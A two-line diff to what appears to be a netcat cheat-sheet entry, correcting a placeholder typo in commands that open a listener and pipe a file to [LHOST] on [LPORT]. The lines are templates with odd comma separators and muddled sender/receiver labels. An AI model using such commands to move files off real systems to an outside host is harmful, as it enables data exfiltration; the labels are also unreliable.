@@ -1,2 +1,2 @@
-nc -lnvp ; ,[LPO],nc [LHOST] [LPORT] < [File] # Sender
+nc -lnvp ; ,[LPORT],nc [LHOST] [LPORT] < [File] # Sender
 nc ,[LHOST], ,[LPORT], ,<, ,[File] # Reciever
